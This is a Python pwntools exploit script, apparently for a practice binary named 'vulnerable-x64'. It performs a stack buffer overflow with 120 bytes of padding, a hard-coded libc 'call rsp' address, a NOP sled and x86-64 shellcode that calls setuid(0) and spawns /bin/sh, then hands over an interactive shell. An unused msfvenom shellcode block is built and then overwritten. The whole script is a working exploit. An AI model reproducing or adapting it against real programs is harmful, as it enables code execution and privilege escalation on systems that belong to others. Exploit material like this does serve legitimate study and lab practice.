#!/usr/bin/env python3

from pwn import *

offset=120
p = process('./vulnerable-x64')

# msfvenom  -p linux/x86/exec -b "\x00\x0d\x0a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xba\x19\x13\x3c\x51\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x06\x31\x57\x12\x83\xc7\x04"
shellcode += b"\x03\x4e\x1d\xde\xa4\x41\xe8\xe9\xa6\x11\xe1"
shellcode += b"\x7d\x06\x22\x9e\x7d\x30\xeb\x3c\x17\xae\x7a"
shellcode += b"\x23\x2a\xae"

shellcode  = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05";

# Finding jmp rsp 
# gdb-peda$ jmpcall rsp /usr/lib/x86_64-linux-gnu/libc.so.6
# 0x7ffff7df30ea : call rsp
jmprsp = p64(0x7ffff7df30ea)

payload = b'A' * offset
payload += jmprsp
payload += b'\x90'*12
payload += shellcode

p.clean()
p.sendline(payload)
p.interactive()

